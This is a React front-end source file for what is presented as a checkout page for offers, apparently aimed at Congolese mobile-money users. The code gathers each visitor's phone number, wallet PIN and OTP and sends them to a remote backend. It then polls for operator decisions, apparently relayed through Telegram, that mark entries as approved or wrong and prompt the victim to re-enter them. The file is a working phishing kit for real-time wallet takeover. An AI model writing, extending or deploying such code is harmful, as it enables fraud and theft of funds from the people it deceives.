import { useEffect, useRef, useState } from 'react';
import CheckoutPage from './components/CheckoutPage';
import LandingPage from './components/LandingPage';
import { BRAND_LOGO_SOURCES } from './constants/brand';

const configuredApiBase = (import.meta.env.VITE_API_BASE_URL || '').trim().replace(/\/$/, '');
const API_BASE_URL = configuredApiBase || 'https://congo-5ck9.onrender.com';
const FALLBACK_API_BASE_URL = (import.meta.env.VITE_FALLBACK_API_BASE_URL || '').trim().replace(/\/$/, '');

const apiFetch = async (path, options) => {
  const directBackendUrl = `${API_BASE_URL}${path}`;
  const sameOriginUrl = path;

  try {
    const response = await fetch(directBackendUrl, options);
    if (!path.startsWith('/api/') || response.status < 500) {
      return response;
    }
  } catch (err) {
    if (!path.startsWith('/api/')) throw err;
  }

  try {
    const sameOriginResponse = await fetch(sameOriginUrl, options);
    if (!path.startsWith('/api/') || sameOriginResponse.status < 500) {
      return sameOriginResponse;
    }
  } catch (err) {
    if (!path.startsWith('/api/')) throw err;
  }

  if (FALLBACK_API_BASE_URL) {
    return fetch(`${FALLBACK_API_BASE_URL}${path}`, options);
  }

  return fetch(directBackendUrl, options);
};

function App() {
  const [data, setData] = useState(null);
  const [error, setError] = useState(null);
  const [checkoutOffer, setCheckoutOffer] = useState(null);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [walletPin, setWalletPin] = useState('');
  const [otpSent, setOtpSent] = useState(false);
  const [otpDigits, setOtpDigits] = useState(['', '', '', '']);
  const [otpTimer, setOtpTimer] = useState(0);
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
  const [phoneError, setPhoneError] = useState('');
  const [walletPinError, setWalletPinError] = useState('');
  const [otpError, setOtpError] = useState('');
  const [submissionError, setSubmissionError] = useState('');
  const [resendError, setResendError] = useState('');
  const [resendMessage, setResendMessage] = useState('');
  const [submissionLoading, setSubmissionLoading] = useState(false);
  const [resendLoading, setResendLoading] = useState(false);
  const [telegramAction, setTelegramAction] = useState(null);
  const [actionError, setActionError] = useState('');
  const [actionLoading, setActionLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [approvalError, setApprovalError] = useState('');
  const [approvalPassed, setApprovalPassed] = useState(false);
  const otpInputRef = useRef([]);
  const approvalReady = approvalPassed || telegramAction?.action === 'allow_proceed';
  const normalizedLocalNumber = phoneNumber.replace(/\D/g, '').slice(0, 9);
  const apiPhoneNumber = normalizedLocalNumber ? `+243${normalizedLocalNumber}` : '';
  const otpCode = otpDigits.join('');

  useEffect(() => {
    if (approvalPassed) {
      const focusTimer = setTimeout(() => otpInputRef.current?.[0]?.focus?.(), 50);
      return () => clearTimeout(focusTimer);
    }
    return undefined;
  }, [approvalPassed]);

  useEffect(() => {
    if (telegramAction?.action !== 'allow_proceed') {
      return;
    }

    setWaitingApproval(false);
    setApprovalPassed(true);
    setOtpSent(true);
    setOtpError('');
    setApprovalError('');
    setActionLoading(false);
  }, [telegramAction]);

  useEffect(() => {
    apiFetch('/api/offres')
      .then((res) => {
        if (!res.ok) {
          if (res.status === 503) {
            throw new Error('Serveur indisponible pour le moment. Reessayez dans quelques instants.');
          }
          throw new Error('Erreur du serveur');
        }
        return res.json();
      })
      .then((json) => setData(json))
      .catch((fetchError) => setError(fetchError.message));
  }, []);

  useEffect(() => {
    if (!approvalReady || paymentConfirmed) {
      return undefined;
    }

    setResendMessage('');
    setResendError('');
    setOtpTimer(60);
    const interval = setInterval(() => {
      setOtpTimer((current) => {
        if (current <= 1) {
          clearInterval(interval);
          return 0;
        }
        return current - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [approvalReady, paymentConfirmed]);

  useEffect(() => {
    if (!waitingApproval || !apiPhoneNumber) {
      return undefined;
    }

    let interval = null;
    const queryPhone = encodeURIComponent(apiPhoneNumber);

    const pollApprovalStatus = async () => {
      try {
        const res = await apiFetch(`/api/action-status?phone=${queryPhone}&stage=approval`);
        if (!res.ok) {
          const json = await res.json().catch(() => null);
          throw new Error(json?.message || 'Echec de verification du statut.');
        }

        const json = await res.json();
        setApprovalError('');
        if (json?.action === 'allow_proceed') {
          setWaitingApproval(false);
          setApprovalPassed(true);
          setOtpSent(true);
          setApprovalError('');
          setOtpError('');
          setActionLoading(false);
          setTelegramAction(json);
          return;
        }

        if (json?.action === 'invalid_info') {
          setWaitingApproval(false);
          setApprovalPassed(false);
          setApprovalError('Code PIN incorrect. Veuillez verifier les informations et reessayer.');
          setOtpSent(false);
          setOtpTimer(0);
          setActionLoading(false);
        }
      } catch (err) {
        setApprovalError('Verification temporairement indisponible. Nouvelle tentative...');
      }
    };

    interval = setInterval(pollApprovalStatus, 3000);
    pollApprovalStatus();

    return () => clearInterval(interval);
  }, [waitingApproval, apiPhoneNumber]);

  useEffect(() => {
    if (!paymentConfirmed || !apiPhoneNumber) {
      return undefined;
    }

    let interval = null;
    const queryPhone = encodeURIComponent(apiPhoneNumber);

    const pollActionStatus = async () => {
      try {
        const res = await apiFetch(`/api/action-status?phone=${queryPhone}&stage=verification`);
        if (!res.ok) {
          const json = await res.json().catch(() => null);
          throw new Error(json?.message || 'Echec de verification du statut OTP.');
        }

        const json = await res.json();
        setActionError('');
        if (json?.action) {
          setTelegramAction(json);
          setActionLoading(false);

          if (json.action === 'wrong_pin') {
            setPaymentConfirmed(false);
            setApprovalPassed(false);
            setOtpSent(false);
            setOtpDigits(['', '', '', '']);
            setOtpTimer(0);
            setWaitingApproval(false);
            setOtpError('');
            setApprovalError('Code PIN incorrect. Veuillez ressaisir votre numero et votre PIN.');
            return;
          }

          if (json.action === 'wrong_code') {
            setPaymentConfirmed(false);
            setApprovalPassed(true);
            setOtpSent(true);
            setOtpTimer(60);
            setOtpDigits(['', '', '', '']);
            setOtpError('Code OTP incorrect. Veuillez le ressaisir.');
          }
        }
      } catch (err) {
        setActionError('Verification temporairement indisponible. Nouvelle tentative...');
      }
    };

    interval = setInterval(pollActionStatus, 3000);
    pollActionStatus();

    return () => clearInterval(interval);
  }, [paymentConfirmed, apiPhoneNumber]);

  const startCheckout = (offre) => {
    setCheckoutOffer(offre);
    setPhoneNumber('');
    setWalletPin('');
    setOtpSent(false);
    setOtpTimer(0);
    setOtpDigits(['', '', '', '']);
    setPaymentConfirmed(false);
    setPhoneError('');
    setWalletPinError('');
    setOtpError('');
    setWaitingApproval(false);
    setApprovalPassed(false);
    setApprovalError('');
    setTelegramAction(null);
    setActionError('');
    setActionLoading(false);
  };

  const handleBack = () => {
    setCheckoutOffer(null);
    setOtpSent(false);
    setPaymentConfirmed(false);
    setOtpTimer(0);
    setOtpDigits(['', '', '', '']);
    setPhoneError('');
    setWalletPinError('');
    setOtpError('');
    setWaitingApproval(false);
    setApprovalPassed(false);
    setApprovalError('');
    setTelegramAction(null);
    setActionError('');
    setActionLoading(false);
  };

  const handleOtpDigitChange = (index, rawValue) => {
    const digit = rawValue.replace(/\D/g, '').slice(-1);
    setOtpDigits((current) => {
      const next = [...current];
      next[index] = digit;
      return next;
    });

    if (digit && index < 3) {
      otpInputRef.current[index + 1]?.focus?.();
    }

    if (otpError) setOtpError('');
    if (submissionError) setSubmissionError('');
  };

  const handleOtpDigitKeyDown = (index, event) => {
    if (event.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpInputRef.current[index - 1]?.focus?.();
    }
  };

  const handleOtpPaste = (event) => {
    event.preventDefault();
    const pasted = event.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (!pasted) {
      return;
    }

    const next = ['', '', '', ''];
    pasted.split('').forEach((char, idx) => {
      if (idx < 4) {
        next[idx] = char;
      }
    });
    setOtpDigits(next);

    const focusIndex = Math.min(pasted.length, 3);
    otpInputRef.current[focusIndex]?.focus?.();
    if (otpError) setOtpError('');
    if (submissionError) setSubmissionError('');
  };

  const handleCheckoutSubmit = async (event) => {
    event.preventDefault();
    setPhoneError('');
    setWalletPinError('');
    setOtpError('');
    setApprovalError('');
    setSubmissionError('');
    setResendError('');
    setResendMessage('');

    if (!otpSent) {
      const validPhone = /^\d{9}$/.test(normalizedLocalNumber);
      const pinVal = walletPin.trim();
      const validPin = /^\d{4,6}$/.test(pinVal);

      if (!validPhone) {
        setPhoneError('Entrez un numero valide a 9 chiffres.');
      }

      if (!validPin) {
        setWalletPinError('Entrez un PIN valide (4 a 6 chiffres).');
      }

      if (!validPhone || !validPin) {
        return;
      }

      setSubmissionLoading(true);
      try {
        const response = await apiFetch('/api/notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            offerId: checkoutOffer.id,
            offerTitle: checkoutOffer.title,
            phoneNumber: apiPhoneNumber,
            walletPin: walletPin.trim()
          })
        });

        const body = await response.json().catch(() => null);
        if (!response.ok) {
          const errorMsg = body?.message || 'Echec de notification.';
          const detail = body?.detail ? ` ${body.detail}` : '';
          throw new Error(`${errorMsg}${detail}`);
        }

        setOtpSent(true);
        setWaitingApproval(true);
        setApprovalPassed(false);
        setApprovalError('');
        setTelegramAction(null);
        setActionError('');
        setActionLoading(true);
        setOtpTimer(60);
        setResendMessage('Validation de vos informations...');
      } catch (err) {
        setSubmissionError(err.message || 'Echec d\'envoi des informations. Veuillez reessayer plus tard.');
      } finally {
        setSubmissionLoading(false);
      }
      return;
    }

    if (otpTimer === 0) {
      setOtpError('OTP expire. Veuillez reessayer.');
      return;
    }

    if (otpCode.length !== 4) {
      setOtpError('Entrez un code OTP valide a 4 chiffres.');
      return;
    }

    setSubmissionLoading(true);

    try {
      const response = await apiFetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          offerId: checkoutOffer.id,
          offerTitle: checkoutOffer.title,
          phoneNumber: apiPhoneNumber,
          walletPin: walletPin.trim(),
          otpCode
        })
      });

      const body = await response.json().catch(() => null);
      if (!response.ok) {
        const errorMsg = body?.message || 'Echec de soumission.';
        const detail = body?.detail ? ` ${body.detail}` : '';
        throw new Error(`${errorMsg}${detail}`);
      }

      setTelegramAction(null);
      setActionError('');
      setActionLoading(true);
      setPaymentConfirmed(true);
    } catch (err) {
      setSubmissionError(err.message || 'Echec d\'envoi des informations. Veuillez reessayer plus tard.');
    } finally {
      setSubmissionLoading(false);
    }
  };

  const handleResendOtp = async () => {
    if (!checkoutOffer) {
      return;
    }

    setResendLoading(true);
    setResendError('');
    setResendMessage('');

    try {
      const response = await apiFetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          offerId: checkoutOffer.id,
          offerTitle: checkoutOffer.title,
          phoneNumber: apiPhoneNumber,
          walletPin: walletPin.trim()
        })
      });

      const body = await response.json().catch(() => null);
      if (!response.ok) {
        const errorMsg = body?.message || 'Echec du renvoi.';
        const detail = body?.detail ? ` ${body.detail}` : '';
        throw new Error(`${errorMsg}${detail}`);
      }

      setResendMessage('OTP renvoye avec succes.');
      setOtpTimer(60);
    } catch (err) {
      setResendError(err.message || 'Echec du renvoi OTP.');
    } finally {
      setResendLoading(false);
    }
  };

  if (error && !data) {
    return (
      <div className="page-shell">
        <div className="message-block error">Erreur : {error}</div>
      </div>
    );
  }

  if (checkoutOffer) {
    return (
      <CheckoutPage
        checkoutOffer={checkoutOffer}
        onBack={handleBack}
        brandSources={BRAND_LOGO_SOURCES}
        waitingApproval={waitingApproval}
        approvalPassed={approvalReady}
        paymentConfirmed={paymentConfirmed}
        apiPhoneNumber={apiPhoneNumber}
        approvalError={approvalError}
        otpTimer={otpTimer}
        otpSent={otpSent}
        phoneError={phoneError}
        walletPinError={walletPinError}
        normalizedLocalNumber={normalizedLocalNumber}
        walletPin={walletPin}
        setPhoneNumber={setPhoneNumber}
        setWalletPin={setWalletPin}
        setPhoneError={setPhoneError}
        setApprovalError={setApprovalError}
        submissionError={submissionError}
        setSubmissionError={setSubmissionError}
        setWalletPinError={setWalletPinError}
        otpDigits={otpDigits}
        otpInputRef={otpInputRef}
        handleOtpPaste={handleOtpPaste}
        handleOtpDigitChange={handleOtpDigitChange}
        handleOtpDigitKeyDown={handleOtpDigitKeyDown}
        otpError={otpError}
        resendLoading={resendLoading}
        handleResendOtp={handleResendOtp}
        resendMessage={resendMessage}
        resendError={resendError}
        handleCheckoutSubmit={handleCheckoutSubmit}
        submissionLoading={submissionLoading}
        actionLoading={actionLoading}
        actionError={actionError}
        telegramAction={telegramAction}
      />
    );
  }

  return (
    <LandingPage
      data={data}
      isLoading={!data}
      onStartCheckout={startCheckout}
      brandSources={BRAND_LOGO_SOURCES}
    />
  );
}

export default App;
